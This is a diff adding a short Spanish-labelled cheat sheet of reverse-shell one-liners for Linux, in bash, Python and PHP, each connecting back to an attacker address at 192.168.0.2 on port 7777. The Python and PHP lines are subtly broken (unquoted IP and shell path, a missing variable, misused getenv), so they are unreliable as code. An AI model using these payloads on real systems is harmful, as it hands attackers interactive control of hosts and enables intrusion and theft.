@@ -1,0 +1,9 @@
+COMANDOS:
+
+Linux:
+
+Conexion a Atacante( IP: 192.168.0.2, PUERTO: 7777):
+
+bash -c 'exec bash -i &>/dev/tcp/192.168.0.2/7777 <&1'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((192.168.0.2,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(/bin/bash)'
+php -r '=fsockopen(getenv("192.168.0.2"),getenv("7777"));exec("/bin/sh -i <&3 >&3 2>&3");'
